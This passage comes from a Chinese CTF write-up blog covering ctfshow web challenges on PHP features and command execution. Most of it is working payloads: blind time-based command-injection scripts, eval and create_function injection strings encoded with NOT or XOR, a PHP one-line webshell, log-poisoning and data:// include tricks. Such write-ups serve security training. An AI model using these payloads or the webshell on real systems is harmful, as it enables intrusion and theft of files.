<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">这时候会调用 classname中的 say_hello方法</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h1><p>在136的基础上限制了写文件的权限，这时候可以考虑用盲打的方式。</p>
<p>猜测文件名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.ascii_letters+string.digits</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">  key=<span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">      payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i,j,n)</span><br><span class="line">      <span class="comment">#print(payload)</span></span><br><span class="line">      url=<span class="string">&quot;http://fd0a116f-e55b-449d-9acf-59f876b4e975.challenge.ctf.show/?c=&quot;</span>+payload</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">          result=result+n</span><br><span class="line">          <span class="built_in">print</span>(result)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> n==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">        key=<span class="number">1</span></span><br><span class="line">  result+=<span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>得到flag所在文件 f149_15_h3r3，接着盲注文件内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.digits+string.ascii_lowercase+<span class="string">&quot;-&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">  <span class="built_in">print</span>(j)</span><br><span class="line">  <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    payload=<span class="string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(j,n)</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    url=<span class="string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        result=result+n</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>因为过滤了{}所以会我们就不加{}出来，跑出来flag然后手动添加就可以了。<br>如果容易出错的话，可以在payload&#x3D;xxx前面加个time.sleep(0.1)</p>
<h1 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h1><p>可以看到只要我们让intval($code)为0就可以了intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code>所以方法就挺多了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1</span><br><span class="line">getdata</span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1=getcwd&amp;f2=getcwd</span><br></pre></td></tr></table></figure>


<h1 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>先来看下正则表达式<code>/^\W+$/</code> 作用是匹配非数字字母下划线的字符构造命令还是很简单的，最主要的任务是return怎么绕过。大家可以看下下面的示例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1;phpinfo();&quot;</span>);</span><br></pre></td></tr></table></figure>


<p>会发现是无法执行phpinfo()的，但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。</p>
<p>这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-phpinfo()-。</p>
<p>现在我们的任务就是取构造命令，那我们就用个简单的方式取反来试一下。</p>
<p>运行脚本构造system(‘tac f*’)得到 (<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%99%d5)<br>所以最终payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=-(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)-&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h1><p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">0</span></span><br></pre></td></tr></table></figure>


<h1 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h1><p>过滤了加减我们还可以用乘除，过滤了~我们可以用异或构造命令具体命令构造payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=*(<span class="string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="string">&quot;%0b%01%03%00%06%00&quot;</span>^<span class="string">&quot;%7f%60%60%20%60%2a&quot;</span>)*&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h1><p>相对上面的几道类似的弱化了些<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=-&amp;v2=(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h1><p>考察点：三目运算符的妙用<br>小测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这样是可以执行phpinfo()的<br>所以只需要在前面的payload上稍加改动就可以了<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=?(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5):&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h1><p>又增加了分号的过滤，所以我们没法用三目运算符了，这时候想到了等号和位运算符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3===(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)||&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>考察点：create_function()代码注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">类似于</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>那么如果我们第二个参数传入 echo 1;}phpinfo();&#x2F;&#x2F;<br>就等价于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">从而执行<span class="title function_ invoke__">phpinfo</span>()命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>fuzz后发现%5c可以绕过这个正则表达式，具体原理可以看下<a href="https://paper.seebug.org/755/">这篇文章</a>这样我们就可以执行任意命令了payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: show=<span class="keyword">echo</span> <span class="number">123</span>;&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac f*&#x27;</span>);<span class="comment">//</span></span><br><span class="line">post: ctf=%<span class="number">5</span>ccreate_function</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>没有过滤^，所以直接异或构造就可以了。<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=(<span class="string">&quot;%08%02%08%09%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7d%60%60&quot;</span>)(<span class="string">&quot;%09%01%03%01%06%02&quot;</span>^<span class="string">&quot;%7d%60%60%21%60%28&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>后来问了下出题人发现这不是预期解，预期解是利用中文变量<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=$哈=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>其实也是利用异或构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>; 异或出来的结果是 _GET</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<p>非预期，直接往index.php里面写一句话<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf=index.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>预期解 条件竞争</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctf=<span class="number">1</span>.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /c*&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>使用bp不断访问并传参，然后开一个去不断访问 1.php</p>
<h1 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h1><p>非预期<br>日志文件包含写一句话<br>修改user_agent内容为一句话，然后包含&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log就可以使用我们写的一句话了。<br>首先访问index.php 修改<code>user_agent为&lt;?php eval($_POST[1]);?&gt;</code></p>
<p>然后包含日志文件后如下图所示</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_2.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>PHP特性</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行</title>
    <url>/WP/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>VIP题目，情况极多，记录！</p>
<span id="more"></span>

<h1 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通配符</span><br><span class="line">payload1:c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla?????&quot;</span>);</span><br><span class="line">payload2:c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla*&quot;</span>);</span><br><span class="line">payload3:c=<span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.php`;或者c=<span class="keyword">echo</span> `nl fl“”ag.php`;</span><br><span class="line">payload4:c=<span class="keyword">echo</span> `nl fl\ag.php`;<span class="comment">//转义字符绕过</span></span><br><span class="line">payload5:c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">payload6:c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);</span><br><span class="line">payload7:c=awk <span class="string">&#x27;&#123;printf $0&#125;&#x27;</span> flag.php||</span><br><span class="line">还有很多姿势，毕竟等于没过滤</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h1><p>在上一道题的基础上多了<code>system和php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">反引号 同<span class="title function_ invoke__">shell_exec</span>() </span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;nl fla?????&#x27;</span>);</span><br><span class="line">c=<span class="keyword">echo</span> `nl fla<span class="string">&#x27;&#x27;</span>g.p<span class="string">&#x27;&#x27;</span>hp`;</span><br><span class="line">c=<span class="keyword">echo</span> `nl fla?????`;</span><br><span class="line">还有上一道题的很多payload都可以使用</span><br></pre></td></tr></table></figure>


<h1 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h1><p>过滤了<code>cat\sort等</code>,空格也被过滤了尝试了一堆方法无果，尝试搞骚得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>cat被过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是</span><br><span class="line">cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line"><span class="number">1</span>、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line">c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>fl[abc]*`);</span><br><span class="line">c=<span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;nl%09fl[a]*&quot;</span>);等价于<span class="title function_ invoke__">system</span>()</span><br><span class="line">c=<span class="keyword">echo</span>`strings%<span class="number">09</span>f*`;</span><br><span class="line">c=<span class="keyword">echo</span>`strings\<span class="variable">$IFS</span>\$<span class="number">9</span>f*`必须加转义字符</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还有其他姿势：<br>首先print_r(scandir(dirname(<strong>FILE</strong>)));查看当前目录下文件<br>然后找到flag.php<br>print_r(next(array_reverse(scandir(dirname(<strong>FILE</strong>)))));<br>之后高亮显示即可<br>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(<strong>FILE</strong>)))));</p>
<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p>小知识：include不用括号，分号可以用?&gt;代替。<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-</span></span><br><span class="line">encode/resource=flag.php</span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h1><p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line">还可以配合UA头执行日志包含</span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><p>在上一道题的基础上过滤了php，和file<br>所以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=</span></span><br><span class="line">也可以日志包含</span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system(“cat f*”);?&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><p>我字母数字RCE，我之后会另一起一篇，单独讲这个。</p>
